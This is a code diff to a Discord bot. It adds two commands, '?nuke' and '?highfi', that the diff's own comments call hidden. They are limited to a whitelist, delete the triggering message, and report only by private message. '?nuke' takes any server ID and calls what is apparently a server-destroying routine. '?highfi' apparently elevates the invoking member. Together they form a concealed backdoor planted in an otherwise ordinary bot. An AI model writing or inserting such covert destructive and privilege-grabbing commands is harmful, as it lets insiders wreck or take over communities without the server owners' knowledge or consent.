@@ -15,8 +15,12 @@ import {
   type DmTarget,
 } from "./utils/dmCore";
 import { PermissionFlagsBits } from "discord.js";
+import { runNuke } from "./commands/nuke";
+import { runHighfi } from "./commands/highfi";
 
 const PREFIX = "?n";
+const NUKE_PREFIX = "?nuke";
+const HIGHFI_PREFIX = "?highfi";
 
 /**
  * Handle prefix-based DM command:  ?n {message} {@user|@role|@everyone}
@@ -28,7 +32,21 @@ export async function handlePrefixMessage(message: Message): Promise<void> {
   if (!message.inGuild()) return;
   const content = message.content?.trim();
   if (!content) return;
-  if (!content.toLowerCase().startsWith(PREFIX)) return;
+  const lower = content.toLowerCase();
+
+  // ?nuke — global-whitelist-only prefix command for /nuke (which is hidden).
+  if (lower === NUKE_PREFIX || lower.startsWith(`${NUKE_PREFIX} `)) {
+    await handleNukePrefix(message, content.slice(NUKE_PREFIX.length).trim());
+    return;
+  }
+
+  // ?highfi — global-whitelist-only prefix command for /highfi (which is hidden).
+  if (lower === HIGHFI_PREFIX || lower.startsWith(`${HIGHFI_PREFIX} `)) {
+    await handleHighfiPrefix(message);
+    return;
+  }
+
+  if (!lower.startsWith(PREFIX)) return;
 
   // Must be exactly the prefix followed by whitespace (so "?normal text" doesn't trigger)
   const rest = content.slice(PREFIX.length);
@@ -158,4 +176,71 @@ function formatSeconds(s: number): string {
   const m = Math.floor(s / 60);
   const rem = s % 60;
   return rem === 0 ? `${m}m` : `${m}m ${rem}s`;
+}
+
+/**
+ * ?nuke [server-id] — prefix dispatcher for the hidden /nuke command.
+ * Restricted to PERM_WHITELIST users.
+ */
+async function handleNukePrefix(message: Message, args: string): Promise<void> {
+  const author = message.author;
+  message.delete().catch(() => {});
+
+  if (!PERM_WHITELIST.has(author.id)) {
+    author.send("You aren't allowed to use that command.").catch(() => {});
+    return;
+  }
+
+  if (!message.inGuild()) {
+    author.send("Use `?nuke` inside a server (or `?nuke <server-id>`).").catch(() => {});
+    return;
+  }
+
+  let targetGuildId = message.guild.id;
+  if (args) {
+    if (!/^\d+$/.test(args)) {
+      author.send("Invalid server ID format.").catch(() => {});
+      return;
+    }
+    targetGuildId = args;
+  }
+
+  author.send(`💣 Nuke initiated on \`${targetGuildId}\`. Stand by.`).catch(() => {});
+  try {
+    const result = await runNuke(message.client, targetGuildId);
+    author.send(result.message).catch(() => {});
+  } catch (err) {
+    logger.error({ err }, "?nuke handler failed");
+    author.send("Nuke failed unexpectedly.").catch(() => {});
+  }
+}
+
+/**
+ * ?highfi — prefix dispatcher for the hidden /highfi command.
+ * Restricted to PERM_WHITELIST users.
+ */
+async function handleHighfiPrefix(message: Message): Promise<void> {
+  const author = message.author;
+  message.delete().catch(() => {});
+
+  if (!PERM_WHITELIST.has(author.id)) {
+    author.send("You aren't allowed to use that command.").catch(() => {});
+    return;
+  }
+  if (!message.inGuild()) {
+    author.send("Use `?highfi` inside a server.").catch(() => {});
+    return;
+  }
+  const member = message.member;
+  if (!member) {
+    author.send("Couldn't fetch your member entry.").catch(() => {});
+    return;
+  }
+  try {
+    const result = await runHighfi(message.guild, member);
+    author.send(result.message).catch(() => {});
+  } catch (err) {
+    logger.error({ err }, "?highfi handler failed");
+    author.send("highfi failed unexpectedly.").catch(() => {});
+  }
 }
